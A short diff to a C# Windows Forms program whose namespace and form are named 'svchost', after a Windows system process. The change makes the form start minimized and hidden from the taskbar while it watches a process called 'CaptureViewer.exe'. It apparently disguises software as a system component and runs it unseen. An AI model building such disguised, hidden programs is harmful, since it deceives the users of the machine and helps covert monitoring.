@@ -10,8 +10,8 @@ namespace svchost
     public svchostForm()
     {
       InitializeComponent();
-      //this.WindowState = FormWindowState.Minimized;
-      //this.ShowInTaskbar = false;
+      this.WindowState = FormWindowState.Minimized;
+      this.ShowInTaskbar = false;
       _appWatcher = new AppWatcher( "CaptureViewer.exe" );
     }
 
